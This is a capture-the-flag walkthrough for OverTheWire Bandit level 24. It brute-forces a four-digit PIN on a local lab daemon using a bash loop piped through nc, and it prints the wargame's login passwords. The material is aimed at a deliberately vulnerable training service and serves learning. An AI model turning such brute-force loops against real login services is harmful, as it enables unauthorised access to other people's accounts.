# Bandit Level 24

> A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
> You do not need to create new connections each time

## Login

```shell
ssh bandit24@bandit.labs.overthewire.org -p 2220

gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

## Solution

First let's check what is the response.

```shell
nc localhost 30002
```

```text
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.

	gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0000

Wrong! Please enter the correct current password and pincode. Try again.
```

So we have to make a script that loops all the combinations.

```shell
mkdir /tmp/my_temp/
```

```shell
nano /tmp/my_temp/brute_bash.sh
```

```shell
for i in {0000..9999}
do
        echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
done
```

```shell
chmod +x /tmp/my_temp/brute_bash.sh
```

Then you have to send the result of the script to a text file.

```shell
/tmp/my_temp/brute_bash.sh > /tmp/my_temp/dict_brute.txt
```

```shell
nc localhost 30002 < /tmp/my_temp/dict_brute.txt | grep -v "Wrong!"
```

```text
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

